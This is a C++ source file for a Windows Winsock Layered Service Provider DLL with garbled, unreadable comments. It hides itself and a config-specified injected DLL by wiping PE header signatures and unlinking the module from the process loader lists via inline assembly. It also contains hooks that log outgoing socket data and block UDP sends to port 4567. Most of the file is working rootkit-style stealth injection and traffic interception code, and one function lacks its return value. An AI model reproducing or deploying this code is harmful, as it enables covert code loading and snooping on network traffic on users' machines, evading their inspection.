//////////////////////////////////////////////////
// LSP.cpp�ļ�


// ����Ҫʹ��UNICODE�ַ���
#define UNICODE
#define _UNICODE

#include <Winsock2.h>
#include <Ws2spi.h>
#include <Windows.h>
#include <tchar.h>
#include "Debug.h"
#include "ConfigFile.h"

#pragma comment(lib, "Ws2_32.lib")



WSPUPCALLTABLE g_pUpCallTable;		// �ϲ㺯���б����LSP�������Լ���α�������ʹ����������б�
WSPPROC_TABLE g_NextProcTable;		// �²㺯���б�
TCHAR	g_szCurrentApp[MAX_PATH];	// ��ǰ���ñ�DLL�ĳ��������


typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_MODULE
  {
      LIST_ENTRY InLoadOrderModuleList;
      LIST_ENTRY InMemoryOrderModuleList;
      LIST_ENTRY InInitializationOrderModuleList;
      PVOID BaseAddress;
      PVOID EntryPoint;
      ULONG SizeOfImage;
      UNICODE_STRING FullDllName;
      UNICODE_STRING BaseDllName;
      ULONG Flags;
      USHORT LoadCount;
      USHORT TlsIndex;
      LIST_ENTRY HashTableEntry;
      ULONG TimeDateStamp;
 } LDR_MODULE, *PLDR_MODULE, *PLML;

// typedef struct _LE{
//   DWORD Flink;
//   DWORD Blink;
// }LE, LIST_ENTRY;

BOOL BreakLdrModuleLink(DWORD dwBaseAddr)
{
  PLDR_MODULE pLMFNode = NULL, pLNode = NULL ;
  PLDR_MODULE pLMHNode = NULL, pLMPNode = NULL;
  PLDR_MODULE pLMTNode = NULL;
  BOOL bSuccess = FALSE;
	
  //��ȡLDR_MODULE����ͷָ��
	__asm{

		pushad
		pushfd
		xor edx, edx
		mov ebx, fs:[edx + 0x30] 
		mov ecx, [ebx + 0x0C] 
		lea edx, [ecx + 0x0C]
		mov ecx, [ecx + 0x0C] 
		mov pLMHNode, edx 
		mov pLMFNode, ecx
		popfd
		popad

	}

	//����Ŀ��
	PLDR_MODULE pLMNode = pLMFNode;
	pLMPNode = pLMHNode;
	do{
		//�Ƚ��Ƿ���Ŀ��ģ��
		if( (DWORD)pLMNode->BaseAddress == dwBaseAddr)
		{
			bSuccess = TRUE;
			break;
		}
		pLMPNode = pLMNode;
		pLMNode = (PLDR_MODULE)pLMNode->InLoadOrderModuleList.Flink;
	}while(pLMNode != pLMHNode);

	if( !bSuccess )
	{
		OutputDebugStringA("cannot find the dest module!");
		return bSuccess; //δ�ҵ�Ŀ��ģ��
	}
	
	//�Ͽ�InLoadOrderModuleList��
	//�ؽ�Flink
	pLMTNode = (PLDR_MODULE)pLMNode->InLoadOrderModuleList.Flink;
	pLMPNode->InLoadOrderModuleList.Flink = (PLIST_ENTRY)pLMTNode;
    //�ؽ�Blink
	((PLDR_MODULE)(pLMNode->InLoadOrderModuleList.Flink))->InLoadOrderModuleList.Blink  = 
	pLMNode->InLoadOrderModuleList.Blink;
    
   //�Ͽ�InMemoryOrderModuleList��
   //�ؽ�Flink
	pLMPNode->InMemoryOrderModuleList.Flink = 
	pLMNode->InMemoryOrderModuleList.Flink;
	//�ؽ�Blink
	pLMTNode = (PLML)(pLMNode->InMemoryOrderModuleList.Flink - sizeof(LIST_ENTRY));
	pLMTNode->InMemoryOrderModuleList.Blink =  
	pLMNode->InMemoryOrderModuleList.Blink;

   //�Ͽ�InInitializationOrderModuleList��
   //�ؽ�Flink
	pLMPNode->InInitializationOrderModuleList.Flink =  
	pLMNode->InInitializationOrderModuleList.Flink;

	//�ؽ�Blink
	pLMTNode = (PLML)(pLMNode->InInitializationOrderModuleList.Flink - 2*sizeof(LIST_ENTRY));
	pLMTNode->InInitializationOrderModuleList.Blink  = pLMNode->InInitializationOrderModuleList.Blink;
}

void ModuleHide(HMODULE hInjectDll)
{
	DWORD dwOldProtect;
	VirtualProtect((LPVOID)hInjectDll,1024,PAGE_READWRITE, &dwOldProtect);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) hInjectDll;
	
	//ĨȥMZ��־
	pDosHeader->e_magic = 0;
	
	//DOSͷ�������PEͷ
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader+1);
	
	//ĨȥPE��־
	pNtHeader->Signature = 0;

	VirtualProtect((LPVOID)hInjectDll,1024,dwOldProtect, &dwOldProtect);
	
	//�Ͽ�LDR_MODULE
	BreakLdrModuleLink((DWORD)hInjectDll);
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			// ȡ����ģ�������
			::GetModuleFileName(NULL, g_szCurrentApp, MAX_PATH);
			ODS1(L" query tcp send to... %s", g_szCurrentApp);
			ModuleHide((HMODULE)hModule);
			//MessageBoxA(NULL, "LSP Inject Success", "LSP Inject", MB_OKCANCEL);
		}
		break;
	}
	return TRUE;
}


LPWSAPROTOCOL_INFOW GetProvider(LPINT lpnTotalProtocols)
{
	DWORD dwSize = 0;
	int nError;
	LPWSAPROTOCOL_INFOW pProtoInfo = NULL;
	
	// ȡ����Ҫ�ĳ���
	if(::WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError) == SOCKET_ERROR)
	{
		if(nError != WSAENOBUFS)
			return NULL;
	}
	
	pProtoInfo = (LPWSAPROTOCOL_INFOW)::GlobalAlloc(GPTR, dwSize);
	*lpnTotalProtocols = ::WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError);
	return pProtoInfo;
}

void FreeProvider(LPWSAPROTOCOL_INFOW pProtoInfo)
{
	::GlobalFree(pProtoInfo);
}

int WSPAPI WSPSend(  SOCKET s,  
			  LPWSABUF lpBuffers, 
			  DWORD dwBufferCount,  
			  LPDWORD lpNumberOfBytesSent, 
			  DWORD dwFlags,  
			  LPWSAOVERLAPPED lpOverlapped, 
			  LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,  
			  LPWSATHREADID lpThreadId,  
			  LPINT lpErrno)
{
	ODS1(L" query tcp send to... %s", g_szCurrentApp);
	
	ODS1(L" query tcp send data... %s", lpBuffers->buf);
	
	
	return g_NextProcTable.lpWSPSend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags,
		      lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

int WSPAPI WSPSendTo(
	SOCKET			s,
	LPWSABUF		lpBuffers,
	DWORD			dwBufferCount,
	LPDWORD			lpNumberOfBytesSent,
	DWORD			dwFlags,
	const struct sockaddr FAR * lpTo,
	int				iTolen,
	LPWSAOVERLAPPED	lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
	LPWSATHREADID	lpThreadId,
	LPINT			lpErrno
)
{
	ODS1(L" query send to... %s", g_szCurrentApp);

	// �ܾ�����Ŀ�Ķ˿�Ϊ4567��UDP���
	SOCKADDR_IN sa = *(SOCKADDR_IN*)lpTo;
	if(sa.sin_port == htons(4567))
	{
		int	iError;
		g_NextProcTable.lpWSPShutdown(s, SD_BOTH, &iError);
		*lpErrno = WSAECONNABORTED;

		ODS(L" deny a sendto ");
		return SOCKET_ERROR;
	}

	return g_NextProcTable.lpWSPSendTo(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpTo
			, iTolen, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);

}

void InjectFunc(void)
{
	char szBuf[MAX_PATH] = {0};
	ConfigFile *pcf = new ConfigFile();
	string strBuf;
	//��ȡ��ע��dll·��
	pcf->GetValue("InjectDll·��", "INJ_DLL_PATH", strBuf);

	//������dll����
	char * pstrDllName = strrchr(strBuf.c_str(),'\\');
	//OutputDebugString(pstrDllName);

	wchar_t     wDllName[MAX_PATH] = {0};
    swprintf(wDllName,L"%S",(pstrDllName+1));
	//OutputDebugStringW(wDllName);
	
	//����dll
	HMODULE hInjectDll = LoadLibraryA(strBuf.c_str());
	//OutputDebugString(strBuf.c_str());
	if (hInjectDll)
	{
		//ȥpe�Ͷ���
		pcf->GetValue("HIDE","HIDE",strBuf);
		if (stricmp("YES",strBuf.c_str()) == 0)
		{
			ModuleHide(hInjectDll);
		}

	}
}

int WSPAPI WSPStartup(
  WORD wVersionRequested,
  LPWSPDATA lpWSPData,
  LPWSAPROTOCOL_INFO lpProtocolInfo,
  WSPUPCALLTABLE UpcallTable,
  LPWSPPROC_TABLE lpProcTable
)
{
	ODS1(L"  WSPStartup...  %s \n", g_szCurrentApp);
	
	//�������ģ��
	
	if(lpProtocolInfo->ProtocolChain.ChainLen <= 1)
	{	
		return WSAEPROVIDERFAILEDINIT;
	}
	
	// �������ϵ��õĺ�����ָ�루�������ǲ�ʹ������
	g_pUpCallTable = UpcallTable;

	// ö��Э�飬�ҵ��²�Э���WSAPROTOCOL_INFOW�ṹ	
	WSAPROTOCOL_INFOW	NextProtocolInfo;
	int nTotalProtos;
	LPWSAPROTOCOL_INFOW pProtoInfo = GetProvider(&nTotalProtos);
	// �²����ID	
	DWORD dwBaseEntryId = lpProtocolInfo->ProtocolChain.ChainEntries[1];
	for(int i=0; i<nTotalProtos; i++)
	{
		if(pProtoInfo[i].dwCatalogEntryId == dwBaseEntryId)
		{
			memcpy(&NextProtocolInfo, &pProtoInfo[i], sizeof(NextProtocolInfo));
			break;
		}
	}
	if(i >= nTotalProtos)
	{
		ODS(L" WSPStartup:	Can not find underlying protocol \n");
		return WSAEPROVIDERFAILEDINIT;
	}

	// �����²�Э���DLL
	int nError;
	TCHAR szBaseProviderDll[MAX_PATH];
	int nLen = MAX_PATH;
	// ȡ���²��ṩ����DLL·��
	if(::WSCGetProviderPath(&NextProtocolInfo.ProviderId, szBaseProviderDll, &nLen, &nError) == SOCKET_ERROR)
	{
		ODS1(L" WSPStartup: WSCGetProviderPath() failed %d \n", nError);
		return WSAEPROVIDERFAILEDINIT;
	}
	if(!::ExpandEnvironmentStrings(szBaseProviderDll, szBaseProviderDll, MAX_PATH))
	{
		ODS1(L" WSPStartup:  ExpandEnvironmentStrings() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}
	// �����²��ṩ����
	HMODULE hModule = ::LoadLibrary(szBaseProviderDll);
	if(hModule == NULL)
	{
		ODS1(L" WSPStartup:  LoadLibrary() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}

	// �����²��ṩ�����WSPStartup����
	LPWSPSTARTUP  pfnWSPStartup = NULL;
	pfnWSPStartup = (LPWSPSTARTUP)::GetProcAddress(hModule, "WSPStartup");
	if(pfnWSPStartup == NULL)
	{
		ODS1(L" WSPStartup:  GetProcAddress() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}

	// �����²��ṩ�����WSPStartup����
	LPWSAPROTOCOL_INFOW pInfo = lpProtocolInfo;
	if(NextProtocolInfo.ProtocolChain.ChainLen == BASE_PROTOCOL)
		pInfo = &NextProtocolInfo;

	int nRet = pfnWSPStartup(wVersionRequested, lpWSPData, pInfo, UpcallTable, lpProcTable);
	if(nRet != ERROR_SUCCESS)
	{
		ODS1(L" WSPStartup:  underlying provider's WSPStartup() failed %d \n", nRet);
		return nRet;
	}

	// �����²��ṩ�ߵĺ�����
	g_NextProcTable = *lpProcTable;

	// �޸Ĵ��ݸ��ϲ�ĺ�����Hook����Ȥ�ĺ�����������Ϊʾ������Hook��WSPSendTo����
	// ��������Hook������������WSPSocket��WSPCloseSocket��WSPConnect��
	//lpProcTable->lpWSPSendTo = WSPSendTo;
	//lpProcTable->lpWSPSend  = WSPSend;

	FreeProvider(pProtoInfo);
	return nRet;
}




